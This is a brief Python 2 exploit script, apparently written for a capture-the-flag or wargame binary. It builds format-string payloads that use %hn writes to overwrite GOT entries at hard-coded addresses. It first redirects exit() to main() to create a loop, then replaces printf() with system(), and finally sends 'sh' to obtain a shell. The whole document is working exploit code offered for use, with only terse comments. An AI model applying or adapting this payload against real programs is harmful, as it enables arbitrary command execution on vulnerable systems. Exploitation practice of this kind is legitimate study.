#! /usr/bin/env python

#080499b8
EXIT_ADDR = "\xb8\x99\x04\x08"

#080499ac
PRINTF_AL = "\xac\x99\x04\x08"
PRINTF_AH = "\xae\x99\x04\x08"

#system addr = b7e63190

# 1st iteration - create loop
# replace exit() with main() to create an infinite loop
print EXIT_ADDR + ".%08x" * 4 + "%34405x%hn"

# 2nd iteration - create exploit
# replace printf() with system() - on the third iteration that means
# we run system(fgets())
print PRINTF_AL + "JUNK"  + PRINTF_AH + ".%08x" * 4 + "%12640x%hn" + "%34390x%hn"

print "sh"
